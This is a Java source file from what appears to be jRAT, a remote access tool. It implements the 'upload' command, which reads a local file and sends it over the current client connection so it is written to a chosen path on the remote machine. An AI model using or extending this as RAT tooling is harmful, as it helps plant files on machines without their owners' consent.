package net.jrat.core.command.commands.connection;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;

import org.apache.commons.cli.CommandLine;

import net.jrat.core.command.Command;
import net.jrat.core.packet.server.S7PacketUpload;

public class Upload extends Command
{
	public Upload()
	{
		super("upload", new String[] { "fpath", "opath" }, new String[] { "sets the filepath", "sets the outputpath" }, "uploads a specified file");
	}

	@Override
	public void execute(CommandLine commandLine) throws Exception
	{
		if(this.server.currentConnection == null)
			throw new Exception("current connection is equal to null");

		final String fpath = commandLine.getOptionValue("fpath", null);
		
		if(fpath == null)
			throw new Exception("filepath is needed");
		
		final String opath = commandLine.getOptionValue("opath", null);
		final File file = new File(fpath);
		
		if(!(file.exists()))
			throw new Exception("file not found");
		
		final BufferedInputStream reader = new BufferedInputStream(new FileInputStream(file));
		
		final ByteArrayOutputStream writer = new ByteArrayOutputStream();
		final byte[] bytes = new byte[(int) file.length()];
		
		int read;
		while(!((read = reader.read(bytes)) == -1))
			writer.write(bytes, 0, read);
		reader.close();
		
		this.server.currentConnection.outputStream.writeObject(new S7PacketUpload(writer.toByteArray(), opath));
		writer.close();
	}
}